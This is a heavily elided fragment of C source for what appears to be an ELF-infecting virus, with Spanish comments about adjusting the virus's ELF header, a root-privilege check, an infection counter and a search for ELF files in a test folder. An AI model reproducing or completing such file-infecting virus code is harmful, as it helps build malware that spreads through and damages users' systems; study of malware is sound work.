/** MODIFIED BY VICTOR GARCIA CARRERA, victorgarcia@correo.ugr.es **/
...
/*  Definimos en tiempo de pre-compilación la arquitectura en la que nos hallamos 
//  para ajustar la cabecera ELF del virus
 ...
 //struct passwd info;
   ...
   if(uid == 0) 
   {
       ...
       if(infections < MAX_INFECT)
           searchForELF("/home/victor/VIRUS_PRUEBA",
